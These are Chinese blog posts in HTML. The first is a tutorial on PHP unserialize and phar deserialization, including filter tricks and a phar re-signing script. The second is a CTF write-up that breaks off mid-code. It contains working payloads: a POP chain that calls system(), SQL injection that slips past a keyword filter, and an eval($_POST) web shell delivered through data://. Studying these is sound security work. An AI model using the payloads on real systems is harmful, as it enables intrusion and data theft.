class="hljs-variable">$param</span>=<span class="hljs-string">&#x27;phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp&#x27;</span>;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;&#125;&#x27;</span>;<br><span class="hljs-variable">$param</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$pass</span>));<br><span class="hljs-variable">$profile</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$param</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$profile</span>-&gt;vip)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">例如下列这串字符串运用到了1和2的方法进行利用：O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:54:&quot;hkhkhkhkhkhkhkhkhkhkhkhkhkhkhkhkhkhk&quot;;s:4:&quot;pass&quot;;s:41:&quot;&quot;;s:4:&quot;pass&quot;;s:6:&quot;benben&quot;;s:3:&quot;vip&quot;;b:1;&#125;&quot;;s:3:&quot;vip&quot;;b:0;&#125;<br></code></pre></td></tr></table></figure><p><a name="fq9nv"></a></p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p><a name="ik7nx"></a></p><h3 id="orange1-phar文件"><a href="#orange1-phar文件" class="headerlink" title="orange1.phar文件"></a>orange1.phar文件</h3><p><strong>1.stub:phar文件标识</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title class_">Phar</span>::<span class="hljs-title function_ invoke__">mapPhar</span>();<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;phar://phar.phar/index.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">__HALT_COMPILER</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。也就是说如果我们留下这个标志位，构造一个图片或者其他文件，那么可以绕过上传限制，并且被 phar 这函数识别利用。<br><strong>2.a manifest describing the contents</strong><br>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。<br><strong>3.the file contents</strong><br>被压缩文件的内容<br><strong>4.[optional] a signature for verifying Phar integrity (phar file format only)</strong><br>签名，放在文件末尾<br><a name="KcpY2"></a></p><h3 id="orange2-实例化测试"><a href="#orange2-实例化测试" class="headerlink" title="orange2.实例化测试"></a>orange2.实例化测试</h3><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作。<br>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    &#125;<br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();  <br>    <span class="hljs-variable">$o</span>-&gt;data=<span class="hljs-string">&#x27;hello L1n!&#x27;</span>;<br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>其实就是把序列化函数<code>serialize</code>变成了第7行以下的代码<br>可以看到meta-data是以序列化的形式存储的：<br><img src="/2024/08/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/4.png"><br><a name="z0gst"></a></p><h3 id="orange3-常见的绕过"><a href="#orange3-常见的绕过" class="headerlink" title="orange3.常见的绕过"></a>orange3.常见的绕过</h3><ul><li><p>当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2:&#x2F;&#x2F;和compress.zlib:&#x2F;&#x2F;等绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">compress.bzip:<span class="hljs-comment">//phar:///test.phar/test.txt</span><br>compress.bzip2:<span class="hljs-comment">//phar:///test.phar/test.txt</span><br>compress.zlib:<span class="hljs-comment">//phar:///home/sx/test.phar/test.txt</span><br></code></pre></td></tr></table></figure></li><li><p>也可以利用其它协议, 如 filter 过滤器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></code></pre></td></tr></table></figure></li><li><p>GIF格式验证可以通过在文件头部添加GIF89a绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(“GIF89a”.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br><span class="hljs-comment">//生成一个phar.phar，修改后缀名为phar.gif（通常上传都是要用gif后缀）</span><br></code></pre></td></tr></table></figure></li><li><p>过滤了__HALT_COMPILER();</p></li></ul><p>将phar文件进行gzip压缩 ，使用压缩后phar文件同样也能反序列化 (常用)<br> linux下使用命令gzip phar.phar 生成<br><a name="Tba94"></a></p><h3 id="orange4-phar文件签名修改"><a href="#orange4-phar文件签名修改" class="headerlink" title="orange4.phar文件签名修改"></a>orange4.phar文件签名修改</h3><p>对于某些情况，我们需要修改phar文件中的内容而达到某些需求(比如要绕过<code>__wakeup</code>要修改属性数量)，而修改后的phar文件由于文件发生改变，所以须要修改签名才能正常使用<br>官方文档(<a href="https://www.php.net/manual/zh/phar.fileformat.signature.php#phar.fileformat.signature">https://www.php.net/manual/zh/phar.fileformat.signature.php#phar.fileformat.signature</a>)中是这么说：<br><img src="/2024/08/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/5.png"><br>表格第二列的0x0001表示的是签名类型1是md5，0x0002代表的是签名类型是sha1，其余的以此类推</p><p>用winhex或010-editor查看phar文件签名类型（以上述代码生成的phar文件为例）<br><img src="/2024/08/18/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89/6.png"><br>修改文件签名的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    f = file.read() <span class="hljs-comment"># 修改内容后的phar文件,以二进制文件形式打开</span><br><br>s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># 获取要签名的数据（对于sha1签名的phar文件，文件末尾28字节为签名的格式）</span><br>h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># 获取签名类型以及GBMB标识，各4个字节</span><br>newf = s + sha1(s).digest() + h <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;newPhar.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(newf) <span class="hljs-comment"># 写入新文件</span><br></code></pre></td></tr></table></figure><p><a name="G1teV"></a></p><h3 id="phar反序列化触发条件"><a href="#phar反序列化触发条件" class="headerlink" title="phar反序列化触发条件"></a>phar反序列化触发条件</h3><ul><li>phar文件能上传到服务器端</li><li>要有可用的反序列化魔术方法</li><li>要有文件操作函数</li><li>文件操作函数参数可控</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web技术总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HnuSec 2024 CTF</title>
    <link href="/2024/08/17/HnuSec/"/>
    <url>/2024/08/17/HnuSec/</url>
    
    <content type="html"><![CDATA[<p><a name="Xdi9k"></a></p><h1 id="战况"><a href="#战况" class="headerlink" title="战况"></a>战况</h1><p>两个二血一个一血，有一题题目出问题了导致没能拿下<br>出题人说算我ak了好吧<br><img src="/2024/08/17/HnuSec/1.png"><br><a name="OYT9Y"></a></p><h1 id="What-Do-You-Want"><a href="#What-Do-You-Want" class="headerlink" title="What Do You Want!"></a>What Do You Want!</h1><p><img src="/2024/08/17/HnuSec/2.png"><br>看样子应该是<code>robotx.txt</code>协议了<br><img src="/2024/08/17/HnuSec/3.png"><br>那么访问<code>/The_Deep_Ends</code>看看<br><img src="/2024/08/17/HnuSec/4.png"><br>那么就是XFF了，可惜不行，用bp爆破出来是X-Client-IP: 127.0.0.1<br>然后就是一系列的http的东西了就直接放payload了，这里的Via也是挺折磨我的，以前没见过然后找了好久而且悟空官网路径忘记加www一直错，给我整的快吐血了<br><img src="/2024/08/17/HnuSec/5.png"><br>访问<code>/The_Golden_Light</code><br><img src="/2024/08/17/HnuSec/6.png"><br>那么就是简单的<code>cookie</code>传参了<br><img src="/2024/08/17/HnuSec/7.png"><br><a name="ldBOR"></a></p><h1 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h1><p>进来提示，感觉是cookie验证<br><img src="/2024/08/17/HnuSec/8.png"><br>打开hacker一看果然是，吧cookie里面的值改成admin就过去了<br><img src="/2024/08/17/HnuSec/9.png"><br><strong>访问&#x2F;hhhheelllloooo.php就是源码了</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WOWO</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$nano</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hahaha</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evn</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;evn-&gt;<span class="hljs-keyword">do</span>=<span class="hljs-string">&#x27;do you know serialize?&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;hahaha;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Soga</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$asdj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$grape</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;asdj-&gt;nano;<br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;grape=<span class="hljs-string">&#x27;123&#x27;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;are you sure?&#x27;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> ;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> ;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$Love</span>=<span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$Love</span>(<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable language_">$this</span>-&gt;b);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;it&#x27;s too esay,yet?&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NANI</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$so</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$star</span>,<span class="hljs-variable">$bob</span></span>)</span>&#123;<br>        <span class="hljs-variable">$str</span>=<span class="hljs-variable language_">$this</span>-&gt;lal;<br>        <span class="hljs-variable">$str</span>();<br><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dman</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$apple</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$strawberry</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;apple;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>        <span class="hljs-variable">$des</span>=<span class="hljs-variable language_">$this</span>-&gt;strawberry;<br>        <span class="hljs-variable">$des</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hnu</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sun</span>=<span class="hljs-string">&#x27;HnuSec is very good&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$setad</span>=<span class="hljs-string">&#x27;do you think so?&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;setad=<span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Thank you,have a fun.&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Hnu&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Hnu&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cmd</span>));<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>开始构造pop链，下面是我构造的，注意是反过来的<br><code>H_tostring-&gt;WOWO_get-&gt;Soga_invoke-&gt;NANI_set-&gt;WOWO_destruct</code><br>其他的魔术方法下面没有可控参数大于2的，于是就只剩H类下面的toString了<br>那么看看我的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//H_tostring-&gt;WOWO_get-&gt;Soga_invoke-&gt;NANI_set-&gt;WOWO_destruct</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WOWO</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$nano</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hahaha</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evn</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Soga</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$asdj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$grape</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&quot;create_function&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;&#125;system(&#x27;cat /flag&#x27;);//&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NANI</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$so</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">WOWO</span>();<br><span class="hljs-variable">$a</span>-&gt;evn = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">NANI</span>();<br><span class="hljs-variable">$a</span>-&gt;evn-&gt;lal = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Soga</span>();<br><span class="hljs-variable">$a</span>-&gt;evn-&gt;lal-&gt;asdj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">WOWO</span>();<br><span class="hljs-variable">$a</span>-&gt;evn-&gt;lal-&gt;asdj-&gt;hahaha = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">H</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>成功拿到flag</strong><br><img src="/2024/08/17/HnuSec/10.png"><br><a name="yJRCM"></a></p><h1 id="谢谢皮蛋🥚"><a href="#谢谢皮蛋🥚" class="headerlink" title="谢谢皮蛋🥚"></a>谢谢皮蛋🥚</h1><p>我进来就是传一个1,然后报错提示，看来是数字注入<br><img src="/2024/08/17/HnuSec/11.png"><br>然后就开始走流程<br>输入<code>1 group by 2#</code>爆列数&#x2F;&#x2F;两列<br>输入<code>1 union select 1,2#</code>报错如下<br><img src="/2024/08/17/HnuSec/12.png"><br>猜测是union被替换了于是<br>输入<code>-11 ununionion select 1,2#</code>爆回显位置<br>输入<code>-11 ununionion select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</code>爆表名，发现&#x3D;被过滤了，绕过一下<br>输入<code>-11 ununionion select 1,group_concat(table_name) from information_schema.tables where table_schema like database()#</code><br><img src="/2024/08/17/HnuSec/13.png"><br>输入<code>-11 ununionion select 1,group_concat(column_name) from information_schema.columns where table_schema like database()#</code>爆列名字<br><img src="/2024/08/17/HnuSec/14.png"><br>看组合就是每个表三列了<br>输入<code>-11 ununionion select 1,group_concat(des,&#39;~&#39;,value) from F149#</code><br><img src="/2024/08/17/HnuSec/15.png"><br><a name="RaxKw"></a></p><h1 id="海北大学后台管理系统Plus"><a href="#海北大学后台管理系统Plus" class="headerlink" title="海北大学后台管理系统Plus"></a>海北大学后台管理系统Plus</h1><p>看一下源码发现用户名<br><img src="/2024/08/17/HnuSec/16.png"><br><strong>用题目给的字典爆破就好了，显而易见的密码</strong><br><img src="/2024/08/17/HnuSec/17.png"><br><strong>进来了就随便输入点东西</strong><br><img src="/2024/08/17/HnuSec/18.png"><br><img src="/2024/08/17/HnuSec/19.png"><br>这密码就藏在源码里，放到hacker里base64解码一下，然后输入<br><img src="/2024/08/17/HnuSec/20.png"><br>拿到地址&#x2F;Ewoji&#x2F;final0012llsnn.php，访问发现是文件包含的题目，源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&lt;|\?|php|&gt;|echo|filter|system|file|%|&amp;|=|`|eval/i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;dangerous function detect!&quot;</span>);<br>    &#125;;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;phpinfo&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">phpinfo</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">waf</span>();<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ban掉了filter，并且参数是data，猜测用</p><p><strong>data:&#x2F;&#x2F;</strong><br>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p><p>然后ban了好多东西，想执行命令只能用base64编码的形式了<br>传入<code>?data=data://text/plain;base64,&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;cmd&#39;]);  &lt;/script&gt;</code><br>（这里后面没编码是为了大家看清楚，实际使用需要base64编码，下同）<br><img src="/2024/08/17/HnuSec/24.png"><br>传进去后台会把一个’&gt;’吃了，猜测有waf<br>所以传入<code>?data=data://text/plain;base64,&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&gt;</code><br><img src="/2024/08/17/HnuSec/21.png"><br>之后就是用cat读flag了<br><a name="D2aOM"></a></p><h1 id="海北大学后台管理系统"><a href="#海北大学后台管理系统" class="headerlink" title="海北大学后台管理系统"></a>海北大学后台管理系统</h1><p>进来就是和上面plus一样的界面，不过这次东西全在源码里<img src="/2024/08/17/HnuSec/25.png"><br>第二关也是看源码发现base64编码的密码<br>和puls一样的步骤不多解释<br>访问&#x2F;Ewoji&#x2F;final.php，展示源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//我是何晨光，我不想在战场上敌人捡到我的后门就可以直接使用，所以我决定加点限制</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span 